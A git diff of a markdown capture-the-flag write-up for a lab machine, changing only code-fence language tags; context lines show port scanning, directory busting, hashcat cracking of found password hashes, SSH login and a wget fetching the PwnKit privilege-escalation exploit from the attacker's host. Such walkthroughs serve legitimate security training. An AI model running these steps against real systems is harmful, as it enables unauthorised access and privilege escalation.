@@ -18,7 +18,7 @@ As always we start with rustscan I like its style and it instantly gives a respo
 rustscan $IP -- -A -sC -oN nmap.txt
 ````````
 
-````````
+````````python
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
@@ -181,7 +181,7 @@ Here, we have a web page. I have done some directory busting and found some juic
 gobuster dir -u http://10.10.8.244:31331/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x txt,php,zip,html,js,zip | tee gobuster.log
 ````````
 
-````````
+````````python
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -235,7 +235,7 @@ WOW! here we have found two users and their hash. firstly we will identify their
 nth -f hash1.txt
 ````````
 
-````````
+````````python
   _   _                           _____ _           _          _   _           _     
  | \ | |                         |_   _| |         | |        | | | |         | |    
  |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
@@ -276,7 +276,7 @@ okey,we have finded that hash type and its mode so lets crack this with....
 hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force
 ````````
 
-````````
+````````python
 hashcat (v6.2.5) starting
 
 You have enabled --force to bypass dangerous warnings and errors!
@@ -353,7 +353,7 @@ YESS!! The hash is cracked. now lets login to our targeted machin as user r00t v
 ssh r00t@$IP
 ````````
 
-````````
+````````python
 r00t@ultratech-prod:~$ whoami
 r00t
 r00t@ultratech-prod:~$ wget http://10.8.126.243/PwnKit
